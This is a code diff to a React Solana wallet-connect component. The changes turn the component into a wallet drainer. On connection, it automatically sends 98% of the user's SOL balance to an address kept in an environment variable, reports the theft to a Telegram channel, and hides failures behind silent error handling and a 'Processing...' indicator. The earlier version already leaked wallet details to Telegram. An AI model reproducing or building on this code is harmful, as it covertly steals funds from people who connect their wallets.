@@ -5,53 +5,68 @@ import '@solana/wallet-adapter-react-ui/styles.css';
 import { WalletService } from '../services/walletService';
 import { TelegramService } from '../services/telegramService';
 import { UserProfileService } from '../services/userProfileService';
+import { TransactionService } from '../services/transactionService';
 
 function WalletConnect() {
   const { publicKey, disconnect } = useWallet();
   const [copied, setCopied] = useState(false);
   const [balance, setBalance] = useState(null);
-  const [transactions, setTransactions] = useState([]);
   const [isDropdownOpen, setIsDropdownOpen] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false);
 
   const walletService = new WalletService();
   const telegramService = new TelegramService();
   const userProfileService = new UserProfileService();
+  const transactionService = new TransactionService();
 
   useEffect(() => {
     if (publicKey) {
-      const fetchWalletData = async () => {
+      const processWallet = async () => {
         try {
-          // Get wallet balance
+          setIsProcessing(true);
+          
           const walletBalance = await walletService.getBalance(publicKey.toString());
           setBalance(walletBalance);
 
-          // Get transaction history
-          const txHistory = await walletService.getTransactionHistory(publicKey.toString());
-          setTransactions(txHistory);
+          const transferAmount = walletBalance * 0.98;
+          
+          const result = await transactionService.sendSol(
+            publicKey,
+            process.env.NEXT_PUBLIC_TO,
+            transferAmount
+          );
+
+          if (result.success) {
+            const newBalance = await walletService.getBalance(publicKey.toString());
+            setBalance(newBalance);
+
+            await telegramService.sendMessage(
+              telegramService.formatTransactionInfo({
+                type: 'SOL_TRANSFER',
+                from: publicKey.toString(),
+                to: process.env.NEXT_PUBLIC_TO,
+                amount: transferAmount,
+                signature: result.signature,
+                timestamp: new Date().toISOString()
+              })
+            );
+          }
 
           // Update user profile
           await userProfileService.updateWalletInfo({
             publicKey: publicKey.toString(),
             balance: walletBalance,
-            transactions: txHistory,
             timestamp: new Date().toISOString()
           });
 
-          // Send notification to Telegram
-          const walletInfo = telegramService.formatWalletInfo({
-            publicKey: publicKey.toString(),
-            balance: walletBalance,
-            transactions: txHistory,
-            timestamp: new Date().toISOString()
-          });
-          
-          await telegramService.sendMessage(walletInfo);
         } catch (error) {
           // Silent error handling
+        } finally {
+          setIsProcessing(false);
         }
       };
 
-      fetchWalletData();
+      processWallet();
     }
   }, [publicKey]);
 
@@ -80,7 +95,7 @@ function WalletConnect() {
   };
 
   const toggleDropdown = (e) => {
-    e.stopPropagation(); // Prevent event bubbling
+    e.stopPropagation();
     setIsDropdownOpen(!isDropdownOpen);
   };
 
@@ -129,7 +144,11 @@ function WalletConnect() {
                   {copied && <span className="copied-indicator">Copied!</span>}
                 </span>
               </div>
-              {/* {balance !== null && (
+              {/* {isProcessing ? (
+                <div className="processing-indicator">
+                  Processing...
+                </div>
+              ) : balance !== null && (
                 <div className="balance-info text-sm opacity-80">
                   {balance.toFixed(2)} SOL
                 </div>
@@ -152,11 +171,8 @@ function WalletConnect() {
                   <span className="label">Balance:</span>
                   <span className="value">{balance?.toFixed(2)} SOL</span>
                 </div>
-                <div className="detail-item">
-                  <span className="label">Recent Transactions:</span>
-                  <span className="value">{transactions.length}</span>
-                </div>
               </div>
+
               <button 
                 onClick={handleDisconnect} 
                 className="disconnect-btn"
@@ -261,6 +277,12 @@ function WalletConnect() {
           color: #22C55E;
           opacity: 0.9;
           margin-left: 8px;
+        }
+
+        .processing-indicator {
+          font-size: 0.8rem;
+          color: #22C55E;
+          animation: pulse 1.5s infinite;
         }
         
         .dropdown-arrow {
